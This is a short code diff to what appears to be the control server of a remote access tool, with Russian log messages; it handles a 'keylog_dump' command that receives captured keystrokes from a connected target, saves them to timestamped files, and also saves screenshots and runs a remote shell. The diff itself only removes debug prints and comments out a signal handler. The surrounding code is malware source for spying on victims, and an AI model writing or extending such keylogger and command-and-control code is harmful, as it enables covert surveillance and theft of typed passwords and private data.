@@ -83,7 +83,6 @@ def save_screenshot(target, screenshot_id):
 
 def save_keylogs(logs):
     if logs.strip() and not logs.startswith("[!!]"):
-        print(f"[DEBUG] Сохраняемые логи: {logs}")
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         file_name = f"keylog_{timestamp}.txt"
         try:
@@ -126,7 +125,6 @@ def shell(target, ip):
             elif command == "keylog_dump":
                 try:
                     logs = reliable_recv(target)
-                    print(f"[DEBUG] Полученные логи: {logs}")
                     save_keylogs(logs)
                 except Exception as e:
                     logging.error(f"[!!] Ошибка при обработке команды keylog_dump: {e}")
@@ -139,9 +137,9 @@ def shell(target, ip):
         logging.info("[+] Клиент отключен")
 
 
-def signal_handler(sig, frame):
-    logging.info("\n[!] Сервер остановлен вручную")
-    sys.exit(0)
+# def signal_handler(sig, frame):
+#     logging.info("\n[!] Сервер остановлен вручную")
+#     sys.exit(0)
 
 
 def server():
